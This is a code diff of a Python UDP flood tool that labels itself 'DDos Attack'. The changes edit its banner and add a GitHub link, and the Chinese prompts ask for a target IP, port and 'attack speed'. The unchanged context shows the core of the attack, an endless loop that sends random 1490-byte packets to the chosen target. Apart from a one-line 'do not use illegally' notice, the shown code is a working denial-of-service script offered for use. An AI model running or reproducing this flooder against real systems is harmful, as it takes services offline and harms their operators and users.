@@ -20,15 +20,16 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet DDos Attack")
-print('[        by Antahezi        ]')
-print('[        版本 1.0           ]')
-print('[        请勿非法使用       ]')
+print('[                      by Antahezi                        ]')
+print('[                        版本 1.0                         ]')
+print('[        Github ： https://github.com/ANTA311/ddos        ]')
+print('[                       请勿非法使用                      ]')
 ip = input("请输入 IP     : ")
 port = int(input("攻击端口      : "))
 sd = int(input("攻击速度(1~1000) : "))
 
 os.system("clear")
-
+os.system("figlet DDos Attack")
 sent = 0
 while True:
      sock.sendto(bytes, (ip,port))
